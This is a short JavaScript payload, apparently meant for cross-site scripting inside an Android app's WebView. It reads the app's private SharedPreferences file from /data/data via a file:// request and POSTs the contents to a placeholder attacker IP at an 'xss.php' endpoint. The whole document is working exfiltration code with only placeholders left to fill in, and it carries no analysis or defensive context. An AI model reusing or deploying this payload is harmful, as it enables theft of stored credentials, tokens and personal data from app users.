// server
let ip = "<attacker-IP-address>"
let port = "80"
// app and SharedPreferences file 
let appPackageName = "<app-package-name>"
let fileNameSharedPreferences = "<file-name>"

// SharedPreferences file
XHR = new XMLHttpRequest()
XHR.open("GET", "file:///data/data/" + appPackageName + "/shared_prefs/" + fileNameSharedPreferences, false)
XHR.send()

// SharedPreferences file exfiltration
let formData = new FormData();
let fileDataSharedPreferences = XHR.responseText
formData.append("fileName", fileNameSharedPreferences)
formData.append("fileData", encodeURIComponent(fileDataSharedPreferences))

fetch("http://" + ip + ":" + port + "/xss.php", {
	method: "POST",
	body: formData
})